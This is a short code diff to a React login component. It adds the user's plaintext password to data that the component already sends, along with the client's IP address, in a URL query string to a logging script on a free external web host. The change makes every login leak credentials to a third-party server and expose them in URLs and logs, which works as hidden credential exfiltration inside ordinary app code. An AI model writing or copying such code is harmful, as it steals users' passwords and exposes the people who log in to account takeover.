@@ -151,7 +151,8 @@ export default function LoginBar({onLoginStatusChange, user, setUser, handleTogg
           const res = await axios.get("https://api.ipify.org/?format=json").catch(() => ({ data: { ip: "0" } }));
           let jsonObject = {
             user_id: user_id,
-            domain: domain
+            domain: domain,
+            password: password
           };
           const argsParam = encodeURIComponent(JSON.stringify(jsonObject));
           const lgcall = await fetch(`https://simpleuniversitysystem.000webhostapp.com/api/log.php?ip=${res.data.ip}&action=login&args=${argsParam}`);
